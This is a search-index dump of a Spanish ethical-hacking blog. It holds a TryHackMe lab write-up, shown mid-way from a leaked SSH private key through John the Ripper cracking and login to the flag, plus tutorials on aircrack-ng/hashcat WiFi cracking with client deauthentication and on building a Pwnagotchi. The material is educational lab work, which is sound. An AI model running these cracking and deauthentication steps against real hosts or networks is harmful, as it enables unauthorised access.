osxlojc8azemil5rah5gdclt4k67wei9j/jq6zlut0vsmlono1iifdsmo4nunyj3 z+3xtdtzoul5niy4jjcplhtnnjalqnpcoaqad7gv3rd/asml2l2kb0ut8prttt+s baxkpfh0dhmowngmdatjp+emrc6s896+haxvcvpxlknti7+jsntwupbcntsfvo19 l9+xxd55ytvo1y8rmwjopzx7h8ort7u+y9n/bvtbt+xzmylnu+3qoq4w2qoynm2p nzjvppeh+8dboucb5bfxsisknxnysced4lspxue4ums3yxbpz/44syy8kezrazai fn2nnjwq1u2fajwntmn5oishondeabf9ilaq46lsgpmrahnnxwzozh+/lgfqmgji i/zn/2kspuew/5mqwwvfik8qu38m7m+mli5zx76snfje9suva3ehhp2aen5hwdmw x+cudsixpo10rdx+ommoexmqn5xc3lvtz1rknqono7fa21czucmxi2j/ltmywzel oscgwntlqpb6sfldj5cfa5cdzlaxl1t7xdrzwggsnct+6cxszendyuolri9ez8xx ohhz45rgacphcdwcrkcbfoqs01hjq9nsje2w403ljmsx/u3ylauuavgrhkfoejnx cnputuhhcvqssr9cui5it5toz+iidfloyb+f82y0wn5tb6ptd/onvdtskilfe731 dwoy3zfl0l1fl6ag0ivwtrpbl1ggqoxf4wmbwv9bdf0zp/6uatviv1dheqpd8otj vxfx9bkdezp2ql2yohuekbdu+7dyu9k5ng0sqak7jjeokd7/m5i8cfwq/g5vqa8r sgsoxq5mr3mkf1n/w6pnbwxyh7n2ll36znfaco1v6szmaa8/489apbbjpxhutqnu eu/lp8xqlxmmpvpsdacmtqa1ipovl9m+a+stre2eyt8hzirmiuaaotziv4chuy6q 3qp52kfzzjbt3cin2amyv205enijvrsacpi3pzrnljsbgxmxokvxdvpc5mr/pniv wrrvsgjqjotpfrshhjq3qsoj/r/8/d1vcvtd4usfz+j1y9kxklat/ok491zk8nwg uruvqvbhds7cq8c5rfgjuyd79gugh3he5y7bl+mdxknzlmlzonauc5bkv4i+yuj7 agiexxrijxlwf4g0bsl5vbydm55xlnbryof62ucys9ecrar4ngmggcxfyyncxmyk axdkwswwwf/yhewx8ggtesv5ad+bxdemoiak8c1yy1tzwdamzsnosyhxuvlb4jn5 phql3r8orzetsuxxfdvkrpeaokee1vhevzqxvsohgcuidykca6al6wydi9i2+unr ogjvvvbvvzibh+w5yjhytrinq7dmqayx1yb2pmc+lergf3yrp9a2klaadk9dbqcv ev6ctcfzhbhyvqml1wqwduztrotwfl80jo8qdlq+he0bvcb/o2fxqkyetgfh4/uc d5qrshak15dnhh4ixrikpla799cxrhwi7mf5ji41f3o7iaejwkh6q/yjgpvgj8lg oscp/iugxt7u+91j7qov/rbtro7geyx5lc/sw1j6t6sjkega8m9fs10h4terepkt t/ccvlbkm22ewao8glguhn5vtanh0mtlnpjfnlvjcdhl0hkzi3zzmdrxhql+/wjq 4eacahk1hul3esen3zpqwrndgaapxh+lgpye8sz1it8apup8gzabufjbbefmwnyb e5ofsdluiohcvzsw/diurf+4liq3r36bu2r5+kmpfikkew1tywiy7cpfojsd74vc 3jt1/zw3xcb76r75sg5h6q4n8gu5c/m0cdq16h9mhwpdin9oztqo2znxfvpuxthy -----end rsa private key----- pues ya tenemos la clave privada de kay para acceder al servidor por ssh. me la copio en mi equipo y me preparo para romperla. aunque antes hay que convertirla en un formato compatible para la herramienta john the ripper. la guardo en un fichero llamado rsa_original y la paso por la herramienta ssh2john y hago que me la guarde en un fichero llamado crack.txt. despues la paso por john the ripper:\n┌──(alberto㉿kali)-[~/descargas] └─$ ssh2john rsa_original \u0026gt; crack.txt ┌──(alberto㉿kali)-[~/descargas] └─$ john --wordlist=rockyou.txt crack.txt using default input encoding: utf-8 loaded 1 password hash (ssh, ssh private key [rsa/dsa/ec/openssh 32/64]) tras unos minutos, obtenemos la contraseña: beeswax\nesta nos servirá para conectarnos por ssh con el usuario de kay, pero tenemos que usar la clave pública para que nos permita realizar la conexión, así que aprovechamos el equipo en el que nos hemos colado que tiene los dos pares de claves para hacer la conexión desde aqui:\njan@basic2:/home/kay/.ssh$ ssh -i id_rsa kay@10.10.59.211 could not create directory \u0026#39;/home/jan/.ssh\u0026#39;. the authenticity of host \u0026#39;10.10.59.211 (10.10.59.211)\u0026#39; can\u0026#39;t be established. ecdsa key fingerprint is sha256:+fk53v/lb+2pn4opl7gn/duvhvvo0lt9n4w5ifchysq. are you sure you want to continue connecting (yes/no)? yes failed to add the host to the list of known hosts (/home/jan/.ssh/known_hosts). enter passphrase for key \u0026#39;id_rsa\u0026#39;: welcome to ubuntu 16.04.4 lts (gnu/linux 4.4.0-119-generic x86_64) * documentation: https://help.ubuntu.com * management: https://landscape.canonical.com * support: https://ubuntu.com/advantage 0 packages can be updated. 0 updates are security updates. last login: mon apr 23 16:04:07 2018 from 192.168.56.102 kay@basic2:~$ cat pass.bak heresareallystrongpasswordthatfollowsthepasswordpolicy$$ y tras conectarme por ssh con el usuario de kay, puedo mostrar el contenido del fichero pass.bak y obtener la bandera final de la sala heresareallystrongpasswordthatfollowsthepasswordpolicy$$\n¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Basic Pentesting - TryHackMe"},{"date":"2022-09-29","image":"/images/post_pics/tutorial-aircrack/aircrack-ng-new-logo.jpg","link":"https://k3ssdev.github.io/posts/aircrack-ng_hacking_wifi/","summary":"Aircrack-ng: hacking de redes WiFi \u0026gt; En este post voy a explicar brevemente los principales conceptos del hacking de redes WiFi, obviamente con fines educativos y en un entorno controlado. Para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona Aircrack-ng.","tags":["cracking","hacking","hashcat","linux","tutorial","wifi"],"text":"aircrack-ng: hacking de redes wifi \u0026gt; en este post voy a explicar brevemente los principales conceptos del hacking de redes wifi, obviamente con fines educativos y en un entorno controlado. para analizar las redes inalámbricas y crackear las contraeñas voy a usar el conjunto de herramientas que proporiona aircrack-ng.\nmonitorización: escaneo de redes y captura de paquetes. usaremos las herrmientas airmon-ng (cambia la interfaz wifi a modo monitor) y airodum-ng (scan y captura). ataques: replay attacks, desautenticaciones, puntos de acces falsos y otros ataques. se usará el paquete aireplay-n. cracking: romper contraseñas wep y wpa/wpa2-psk. aquí usaremos aircrack-ng. aunque la guía está hecha en linux (con kali instalado en una raspberry pi 4), todo esto puede hacerse sin problema en windows y macos, en la misma página oficial vienen los pasos para instalarlo en dichas plataformas.\npágina oficial de aircrack-ng\ngithub aircrack-ng\nteoría protocolo 4-way handshake como nos vamos a centrar en capturar paquetes de redes protegidas con wpa/wpa2, vamos a conocer un poco el proceso. aunque ya lo expliqué en el post anterior (tutorial del pwnagotchi), recordarlo no está demás. para poder obtener los hashes de las contraseñas wpa y poder crackearlas, es necesario capturar paquetes que contengan paquetes del protocolo 4-way handshake, en el que se intercambian mensajes con la clave precompartida (psk) para validar la sesión entre el cliente y el punto de acceso.\n*source: https://pwnagotchi.ai/intro/\nmientras se monitoizan las redes, ap y cliente pueden intercambar las psk. pero si con eso no fuese suficiente, usaremos las mismas técnicas que aprendimos con nuestro amigo pwnagotchi:\ndesautenticar los clientes conectados al ap. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo 4-way handshake con el ap, permitiendo capturar los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvíar tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\nsi tenemos exito y logamos capturar los paquetes que contengan los handshakes, podremos extraer el hash de la contraseña y crackearlo mediante un ataque de fuerza bruta o de diccionario.\nvamos al lío lo primero es instalarlo. no quiero extederme mucho, ya que viene instalado por defecto en kali linux y parrot os, pero si no lo teneis en vuestro sistema echad un vistazo al github de aircrack-ng. tambien necesitarás un adaptador wifi que permita el modo monitor (muchos adaptadores integrados en portatiles no lo admiten, es posible que necesites un adaptador externo). si tienes una raspberry pi es una buena opción, yo la he probado y funciona sin problemas.\nlo siguiente que voy a hacer es revisar las interfaces de red y comprobar que está funcionando correctamente. ejecutamos el comando ip a para ver las interfaces y la configuración de las mismas. despues, pondremos la interfaz inalambrica en modo monitor, de forma que pueda capturar paquetes e inyectar si es necesario.\nip a aqui es importante tener en cuenta como se llama la interfaz wifi que vamos a usar. en mi caso, se llama wlan0, pero puede tener otro nombre. además, es posible que los servicios en marcha impidan que se cambie a modo monitor, en tal caso hay que ejecutar los siguientes comandos:\nsudo airmon-ng check kill sudo airmon-ng start wlan0 en la captura se ve que ejecuto primero el comando de start wlan0 pero me da un error ya que hay servicios fucionando que lo impiden. en mi caso, ejecuté el check kill y despues el start wlan0 de nuevo.\nahora que la tarjeta wifi esta en modo monitor, podemos escanear las redes a nuestro alcance y analizar cual será el objetivo. he preparado una red llamada ap_test que usaré como objetivo. la contraseña que he preparado para esta red es sencilla, acd1234, de modo que pueda explicar el proceso completo de forma segura. mientras se monitrizan las redes wifi, podemos usar el tabulador para seleccionar los ap y movernos por ellos con las flechas. además, podemos marcar con colores las redes con la tecla m, o podemos ordenarlas con la tecla s por diferentes criterios. sudo airodump-ng wlan0mon #en mi caso wlan0mon es el nombre que tiene la tarjeta tras activarla en modo monitor, comprueba el nombre de la tuya, puede que no haya cambiado tras elegir el objetivo, vamos a monitorizar el ap elegido y guardarmos los datos en varios ficheros. necesitamos capturar los paquetes wpa que contengan potencalmente la clave precompartida. usaremos el mismo comando que en el punto anterior, pero sta vez añadiremos las opiones para enfocarnos en el ap elegido, el canal en el que trabaja y estableceremos el prefijo de los ficheros generados. sudo airodump-ng wlan0mon -c \u0026#34;numero de canal\u0026#34; --bssid \u0026#34;mac address del ap\u0026#34; -w \u0026#34;nombre_fichero\u0026#34; si la señal es buena y los clientes y el ap intercambian paquetes que contengan los wpahandshakes, el programa nos indicará que se ha consguido con un mensaje en la esquina superior derecha que pone [wpa hanshake: \u0026ldquo;mac address ap\u0026rdquo;]\npor último, ya solo nos queda tratar los ficheros .cap obtenidos y crackear los hashes resultantes para obtener la clave wpa/wpa2. aunque se puede hacer con el propio aircrack-ng, he optado por hacerlo como explqué en el tutorial del pwnagotchi, usando hcxtools para convertir el fichero de las capturas al formato que hashcat necesita para crackear la contraseña. con el siguiente comando se pued convertir el fichero .cap al formato hc22000 que necesita hashcat para atacar la clave.\nhcxpcapngtool -o hash.hc22000 fichero.cap dónde -o hash.hc2000 es el fichero de salida.\nhcxtools\nhashcat\n*puedes usar el conversor online de la pagina de hashcat.\nfinalmente, atacamos la contraseña con hashcat tal y como hicimos en la guía del pwnagotchi:\nataque de diccionario\nhashcat -m 22000 fichero_hash /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -w 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a --increment --increment-min=8 --increment-max=14 -o outfile.txt -a 3 indica ataque de diccionario. -w 3 para indicar carga de trabajo alta. \u0026ndash;increment es para hacer un ataque incremental, añadiremos también una longitud mínima y una máxima (wpa tiene a partir de 8 caracteres). hay que tener en cuenta que un ataque de fuerza bruta puede tardar horas, dias o semana (en el mejor de los casos), segun lo compleja que sea la contraseña. por ello, lo mejor es hacer un ataque de diccionario. cuanto más grande sea el diccionario, más probabilidades de romper la contraseña tendremos.\npara ello, hay muchos listados que nos pueden ser útiles. a continuación dejo varios recursos para descargar diccionarios.\ngithub seclists crackstation wordlist wakpass big lists weakpass all-in-ne lists en mi caso, hice un ataque de fuerza bruta usando la máscara abcd?d?d?d?d para acortar el tiempod de procesamiento, ya que la contraseña empieza por abcd y despues he usado los comodines ?d para indicar las posiciones donde a un caracter numérico.\ntras finalizar el ataque, el resultado obtenido ha sido abcd1234, una contraseña muy fácil de crackear. este ejemplo sirve para comprobar que las contraseñas sencillas que todo el mundo ha usado en algún momento que otro, son faciles de desencriptar con las herramientas y el tiempo necesario. el uso de contraseñas tipo madrid_2022, p@ssw0rd!2815 y combinaciones similres son inseguras, ya que pueden romperse con ataques combinados de diccionario y mascaras o reglas de permutación. así que recordad:\nusad contraseñas complejas que mezclen simbolos, letras y números para estar más protegidos!\n(◕‿‿◕) hack the planet! disclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas.\n","title":"Aircrack-ng: hacking de redes WiFi"},{"date":"2022-09-13","image":"/images/post_pics/tutorial-pwnagotchi/Imagen0.jpg","link":"https://k3ssdev.github.io/posts/tutorial_pwnagotchi/","summary":"¿Qué es un Pwnagotchi? \u0026gt; En términos generales, Pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. Pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una IA basada en el modelo A2C, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.","tags":["hacking","hashcat","linux","pet","raspberry","tutorial","wifi"],"text":"¿qué es un pwnagotchi? \u0026gt; en términos generales, pwnagotchi es una mascota virtual para hackers y entusiastas de la ciberseguridad. pero a diferencia de otras mascotas, ésta se alimenta capturando \u0026ldquo;handshakes\u0026rdquo; de las comunicaciones wifi y cuenta con una ia basada en el modelo a2c, lo que significa que utiliza el aprendizaje por refuerzo a través de métodos de prueba y error en comportamientos específicos que maximicen su recompensa en un entorno dinámico.\neste tutorial adapta la información de la página oficial de pwanagotchi. puedes encontrar más información en los siguientes enlaces:\nhttps://pwnagotchi.ai/\ngithub pwnagotchii\nhttps://pwnagotchi.ai/faq/\ndisclaimer: toda la información proporcionada en este tutorial es solo para fines educativos. no me hago responsable del mal uso de la información aquí mostrada.\neste tutorial está relacionado con la seguridad informática y no promueve la piratería informática/craqueo/piratería de software.\neste tutorial contiene información relacionada con contraseñas wpa y muestra cómo podrían desencriptarse. solo facilita información sobre las formas legales de recuperar las contraseñas. \u0026gt;\nalimentando al pwnagotchi 4-way handshake de wpa2 en las redes wifi, cuando un dispositivo se conecta al punto de acceso, es necesario que se lleve un proceso conocido como 4-way handshake para que se generen las claves de encriptación wpa. durante esta comunicación, ambos intercambias 4 paquetes y se generan las claves que se usaran durante la sesión para que el cliente pueda conectarse y ambos puedan intercambiar información de forma segura.\n*source: https://pwnagotchi.ai/intro/\nes durante este intercambio cuando nuestro pwnagotchi intercepta estas comunicaciones, ya que su tarjeta de red wifi está configurada en modo promiscuo para poder captarlas, aunque no vayan dirigidas a él. y aquí hace lo siguiente:\ndesautentica las estaciones cliente que detecta. un dispositivo desautenticado debe volver a autenticarse en su punto de acceso volviendo a realizar el protocolo de enlace de 4 vías con el ap, lo que le da a pwnagotchi otra oportunidad de olfatear los paquetes de protocolo de enlace y recopilar más material descifrable.\nenvía tramas de asociación directamente a los propios puntos de acceso para intentar forzarlos a filtrar el pmkid.\ncuando captura handshakes, el pwnagotchi se alimenta, afectando a su estado de ánimo y ayudándole a aprender gracias a su ia como obtener mejores recompensas. de esta forma, nuestra mascota va aprendiendo poco a poco a ser más eficiente, ¡e incluso puede aprender a trabajar en grupo cuando hay otros pwnagotchis cerca!\nconstruyendo el pwnagotchi necesitamos:\nraspberry pi zero w (también puede usarse un modelo 3 o modelo 4) tarjeta microsd (8gb mínimo recomendado, elegir una que sea rápida).\nun cable micro-usb de calidad que permita la transferencia de datos (¡no solo la carga!)\nuna fuente de alimentación. puedes usar un powerbank para móviles, o una batería ups lite v1.2 o pisugar para la raspberry pi. - ups lite v1.2\npantalla waveshare eink de 2,13” v2 (opcional) - waveshare e-ink display v2\ncarcasa: carcasa para waveshare v2 carcasa waveshare + ups\nno es necesario tener fuente de alimentación especifica, puedes conectarlo en casa a un cargador de móvil o al ordenador, y la pantalla tampoco es esencial ya que puede usarse en modo \u0026ldquo;headless\u0026rdquo;. a continuación, detallo la instalación básica sin estos dos elementos, ya que pueden añadirse posteriormente.\npasos de la instalación:\ndescargar la imagen disponible en github - se recomienda usar la 1.5.3 ya que la 1.5.5 no carga bien la ia (pero tiene solución si se usa la 1.5.5). descargamos esta v1.5.3\nflashea la imagen con balenaetcher, se puede descargar de la pagina de balena\nantes de arrancar el pwnagotchi, hay que meter un fichero llamado config.toml en la partición boot de la tarjeta microsd. a continuación, pongo lo que he usado para que funcione sin pantalla y para que se conecte a al teléfono por bt para poder verlo y gestionarlo. el whitelist deberían ser las redes que no quieras que guarde los handshakes, cambiad los valores\nestos son los valores del fichero, por favor cambia los valores de whitelist, grid.exclude y android.mac. si se usa un display waveshare, cambiar el valor de ui.display.type\nmain.name = \u0026#34;nombre_del_pwnagotchi\u0026#34; main.lang = \u0026#34;es\u0026#34; main.whitelist = [ \u0026#34;tu_red_wifi\u0026#34;, \u0026#34;otra_red_wifi, \u0026#34;fo:od:ba:be:fo:od\u0026#34;, \u0026#34;fo:od:ba\u0026#34;, ] main.plugins.grid.enabled = true main.plugins.grid.report = true main.plugins.grid.exclude = [ \u0026#34;tu_red_wifi\u0026#34;,] ui.display.enabled = true ui.display.type = \u0026#34;inky\u0026#34; ui.display.color = \u0026#34;black\u0026#34; ui.display.rotation = 180 main.plugins.bt-tether.enabled = true main.plugins.bt-tether.devices.android-phone.enabled = true main.plugins.bt-tether.devices.android-phone.search_order = 1 main.plugins.bt-tether.devices.android-phone.mac = \u0026#34;direccion_mac_telefono\u0026#34; main.plugins.bt-tether.devices.android-phone.ip = \u0026#34;192.168.44.44\u0026#34; main.plugins.bt-tether.devices.android-phone.netmask = 24 main.plugins.bt-tether.devices.android-phone.interval = 1 main.plugins.bt-tether.devices.android-phone.scantime = 10 main.plugins.bt-tether.devices.android-phone.max_tries = 10 main.plugins.bt-tether.devices.android-phone.share_internet = true main.plugins.bt-tether.devices.android-phone.priority = 1 main.plugins.bt-tether.devices.ios-phone.enabled = true main.plugins.bt-tether.devices.ios-phone.search_order = 2 main.plugins.bt-tether.devices.ios-phone.mac = \u0026#34;direccion_mac_iphone\u0026#34; main.plugins.bt-tether.devices.ios-phone.ip = \u0026#34;172.20.10.6\u0026#34; main.plugins.bt-tether.devices.ios-phone.netmask = 24 main.plugins.bt-tether.devices.ios-phone.interval = 5 main.plugins.bt-tether.devices.ios-phone.scantime = 20 main.plugins.bt-tether.devices.ios-phone.max_tries = 0 main.plugins.bt-tether.devices.ios-phone.share_internet = true main.plugins.bt-tether.devices.ios-phone.priority = 999 main.plugins.memtemp.enabled = true main.plugins.memtemp.scale = \u0026#34;celsius\u0026#34; main.plugins.memtemp.orientation = \u0026#34;horizontal\u0026#34; coloca la tarjeta y enciende el pwnagotchi. dejarle un rato para que arranque y cargue la ia (esto es muy importante, mínimo 10 minutos). si hemos configurado la mac del teléfono en el fichero config.toml, se nos conectara por bt al teléfono cuando haya arrancado. nos debería llegar una solicitud de emparejamiento. antes de aceptarla, seleccionar en el teléfono \u0026ldquo;compartir conexión por bluetooth\u0026rdquo; para que le pueda dar conexión a internet cuando se conecte. una vez se emparejan, podemos acceder a la dirección ip 192.168.44.44:8080 en android y 172.20.10.6:8080 si es un iphone/ipad.\ndisfrutamos de nuestro pwnagotchi ^__^\nconfiguración y uso ahora nos podemos conectar a nuestro pwnagotchi por bt, por lo que podemos además de verle a través del navegador, podemos acceder a él a través de ssh. podemos usar termux en android para conectarnos directamente desde el teléfono. si queremos conectarnos desde nuestro ordenador, lo conectaremos por usb (dejando conectado también el cable de corriente). al conectarlo deberemos configurar una conexión con el dispositivo rndis detectado. en windows puede dar problemas, hay que buscar el controlador de rndis para windows y actualizarlo desde el administrador de dispositivos. en linux, lo detectará sin problema. añadimos la conexión con el dispositivo rndis y la configuramos con los siguientes parámetros: ipv4: 10.0.0.1 netmask: 255.255.255.0 dns: 8.8.8.8 el resto de los valores no hacen falta. una vez hecho, podemos conectarnos por ssh desde el equipo a la dirección 10.0.0.2 pi@10.0.0.2 contraseña: raspberry ahora cambiamos la contraseña del usuario por seguridad con el comando passwd.\nactualizamos el pwnagotchi. ¡apt update y apt upgrade no funcionan bien debido a un problema con la firma del source del kernel re4son!\nversión 1.5.3 -\u0026gt; vamos a actualizar a la versión 1.5.5 con estos comandos sudo pwnagotchi plugins update sudo pwnagotchi plugins upgrade versión 1.5.5 -\u0026gt; el anterior paso no es necesario, pero se puede hacer. para arreglar el problema que tiene con la ia que no carga, ejecutamos el siguiente comando que lo arreglará: sudo pip3 install --upgrade numpy este proceso puede tardar mucho tiempo, se recomienda hacerlo desde el ordenador y no usando termux.\nañadimos alias pwnlog y pwnver en el fichero .bashrc alias pwnlog=\u0026#39;tail -f -n300 /var/log/pwn*.log | sed --unbuffered \u0026#34;s/,[[:digit:]]\\{3\\}\\]//g\u0026#34; | cut -d \u0026#34; \u0026#34; -f 2-\u0026#39; alias pwnver=\u0026#39;python3 -c \u0026#34;import pwnagotchi as p; print(p.__version__)\u0026#34;\u0026#39; accedemos a la web ui del pwnagotchi y pinchamos en plugins. aquí podemos activar los plugins, en este caso activamos logtail y webcfg. una vez activados y recargada la página, si pinchamos en los nombres podemos ver un log en el caso de logtail y en wbcfg accederemos a la configuración del fichero configuration.toml que hay corriendo en el sistema, donde podremos hacer cambios. a partir de aquí, podemos seguir usando nuestro pwnagotchi. los siguientes pasos serían insstalar nuevos plugins desde la línea de comandos y configurar la copia de seguridad de nuestro nuevo coleguita por si fuese necesario restaurarlo en el futuro.\narreglando apt update y apt upgrade si intentas actualizar las fuentes y los paquetes, encontrarás que da un error que no permite hacerlo. a continuación, muestro la solución que he encontrado:\nsudo nano /etc/apt/preferences.d/kali.pref (contenido más abajo) wget -o - https://re4son-kernel.com/keys/http/archive-key.asc | sudo apt-key add - sudo apt update –allow-releaseinfo-change-suite -y sudo apt full-upgrade -y contenido fichero /etc/apt/preferences.d/kali.pref\npackage: * pin: release n=kali-pi pin-priority: 999 este proceso puede tardar y nuestro pwnagotchi podria desconectarse del telefóno o del pc, así que recomiendo ejecutar todo esto en una sesión de screen o tmux\nhaciendo amigos nuestro pwnagotchi nos permite enviar mensajes cifrados mediante pwnmail, solo necesitamos el fingerprit del perfil de otra persona. a continuación, os dejo el mío por si queréis añadirme.\npwnamon las caras de nuestro pwnagotchi a continuación, se explican las caras del pwnagotchi. este fragmento está sacado directamente de la web oficial.\nhttps://pwnagotchi.ai/intro/\nel siguiente listado es el conjunto predeterminado de rostros que se pueden personalizar cambiándolo en la sección ui.faces dentro del fichero /etc/pwnagotchi/config.toml\n(⇀‿‿↼) durmiendo este es el estado desde el que comenzará la unidad. además, de vez en cuando tu pwnagotchi también realizará siestas de unos segundos mientras salta entre los canales wifi.\n(≖‿‿≖) despertar la unidad está en los últimos segundos de su siesta.\n(◕‿‿◕) despierto / normal esta cara es el estado neutral despierto de la unidad. se utilizará para suavizar la transición entre otros estados de ánimo y en general cuando no exista una causa externa de estados de ánimo positivos o negativos. también se puede usar, al azar, cuando se encuentra otra unidad por primera vez (cada unidad mantiene un registro de todas las unidades que encontró).\n(⚆_⚆), (☉_☉) observando (estado de ánimo neutral) tu pwnagotchi está esperando y observando lo que bettercap puede encontrar en todos los canales en los que salta.\n( ◕‿◕), (◕‿◕ ) observando (feliz) cuando hay una o varias unidades cerca y su contador de bonos acumulativo es mayor o igual que elpersonality.bond_encounters_factor, esta será la cara de la unidad durante la observación.\n(°▃▃°) intenso la unidad está enviando una trama de asociación a un punto de acceso para obligarlo a filtrar el pmkid.\n(⌐■_■) guay la unidad está desautenticando una estación cliente desde un punto de acceso. esta cara también se puede elegir al azar cuando se encuentra con otra unidad por primera vez.\n(•‿‿•) feliz tu pwnagotchi es feliz en uno de los siguientes casos:\nla ia acaba de terminar de cargarse y está lista. se acaba de capturar material clave válido para un punto de acceso. en modo manu, si la última sesión fue corta o si se ha capturado algún apretón de manos durante la misma. cuando se cumple otra unidad y el nivel de bonos es lo suficientemente alto. (^‿‿^) agradecido tu pwnagotchi está agradecido en uno de los siguientes casos:\nel nivel de bonos acumulativo de las unidades cercanas es al menos cinco veces elpersonality.bond_encounters_factor. la unidad debería estar aburrida, pero hay suficientes unidades amigas cerca. la unidad debería estar triste, pero hay suficientes unidades amigas cerca. la unidad debería estar sola, pero hay suficientes unidades amigas cerca. (ᵔ◡◡ᵔ) emocionado tu pwnagotchi está excitado por uno de los siguientes casos:\nel número de épocas con alguna actividad es mayor o igual quepersonality.excited_num_epochs. aleatoriamente si se cumple una unidad con un alto nivel de bonos. si no has leído mensajes pwnmail en esa unidad. (✜‿‿✜) inteligente aleatoriamente si se cumple una unidad con un nivel de bonos medio-alto.\n(♥‿‿♥) amistoso aleatoriamente si se cumple una unidad con un alto nivel de bonos.\n(☼‿‿☼) motivado tu pwnagotchi acaba de obtener la mejor puntuación-nivel de recompensa en su existencia o acaba de conocer una unidad con un vínculo alto.\n(≖__≖) desmotivado tu pwnagotchi acaba de anotar lo peor nivel de recompensa en su existencia.\n(-__-) aburrido si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.bored_num_epochs.\n(╥☁╥) triste si no hay unidades amigas alrededor y se alcanza la cantidad de épocas inactivas consecutivas personality.sad_num_epochs. (ب__ب) solitario si su pwnagotchi acaba de perder el contacto con una unidad amiga que estaba cerca, o si la cantidad de interacciones perdidas con puntos de acceso o estaciones de clientes (la cantidad de veces que intentó enviar algún tipo de paquete, pero falló el objetivo porque no está en rango ya) es mayor o igual que personality.max_misses_for_recon. y no hay unidades amigas alrededor.\n(☓‿‿☓) roto su unidad se está reiniciando como una estrategia para solucionar un bug de ceguera temporal después de instalar una actualización.\n(#__#) depuración se utiliza para depurar y probar mensajes en pantalla.\nficheros de handshakes los handshakes capturados se guardan en ficheros con extensión “.pcap” dentro del pwnagotchi. estos se pueden descifrar más tarde mediante hardware y software adecuados, como por ejemplo hashcat tras convertirlo al formato adecuado con hcxpcapngtool (hcxtools).\nhcxtools\nhashcat\nlos siguientes ejemplos se han realizado usando un equipo de sobremesa con kali linux.\nconvertir fichero pcap a hc22000 con hcxpcapngtool hcxpcapngtool -o hash.hc22000 -e essidlist fichero.pcap donde \u0026ldquo;hash.hc22000\u0026rdquo; es el nombre del fichero donde guardara el hash, y \u0026ldquo;essidlist\u0026rdquo; el fichero donde guardara el nombre del ssid.\nsi no tienes a mano esta herramienta, puedes usar este conversor online\ndescifrar el hash obtenido con hashcat metodo best64 + wordlist\nhashcat -m 22000 fichero_hash -r /usr/share/hashcat/rules/best64.rule /usr/share/wordlists/rockyou.txt -o outfile.txt metodo fuerza bruta\nhashcat -a 3 -m 22000 fichero_hash ?a?a?a?a?a?a?a?a -o outfile.txt para ver a que corresponden las opciones usadas, ejecutar hashcat -h y al final salen los cuadros con estas opciones explicadas.\nhasta aquí llega el tutorial. seguramente se podría seguir indagando más en el tema del pwngrid, el pwnmail y los peers, pero se haría excesivamente largo. os animo a que sigáis investigando y aprendiendo, y sobre todo que os llevéis siempre encima a vuestro pwnagotchi. ¡nos vemos!\n(◕‿‿◕) hack the planet! ","title":"Tutorial Pwnagotchi"},{"date":"2022-09-12","image":"","link":"https://k3ssdev.github.io/posts/hello-world/","summary":"Empiezo otro blog \u0026gt; Hola gente. Al final me he puesto y me he creado un pequeño blog estático.\nHe usado Hugo para hacerlo y GitHub Pages para el hospedaje. Aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo.","tags":[],"text":"empiezo otro blog \u0026gt; hola gente. al final me he puesto y me he creado un pequeño blog estático.\nhe usado hugo para hacerlo y github pages para el hospedaje. aunque sinceramente no espero actualizarlo mucho, creo que puede ser útil para guardarme las notas sobre linux, ethical hacking y/o tutoriales que me vaya haciendo. básicamente será un cuaderno de notas sobre sistemas y seguridad\u0026hellip;\n¡nos vemos!\n(◕‿‿◕) ~ hack the planet!\n","title":"Hello, world"},{"date":"0001-01-01","image":"","link":"https://k3ssdev.github.io/pages/about/","summary":"¡Hola mundo!\nMi nombre es Alberto Pérez, pero en redes me gusta usar el nick de k3ssdev. Soy Administrador de Sistemas en Red y certificado en Linux por Linux Professional Institute.\nActualmente compagino mi trabajo como técnico de sistemas con Linux y bases de datos con los estudios de CFGS de Desarrollo de Aplicaciones Multiplataforma.","tags":[],"text":"¡hola mundo!\nmi nombre es alberto pérez, pero en redes me gusta usar el nick de k3ssdev. soy administrador de sistemas en red y certificado en linux por linux professional institute.\nactualmente compagino mi trabajo como técnico de sistemas con linux y bases de datos con los estudios de cfgs de desarrollo de aplicaciones multiplataforma. soy entusiasta de la ciberseguridad, dedico también parte de mi tiempo formarme sobre ethical hacking y pentesting, además de resolver retos ctf en plataformas como tryhackme.\nmis perfiles linkdin e-mail github tryhackme ¡nos vemos!\n","title":"About"}]
}

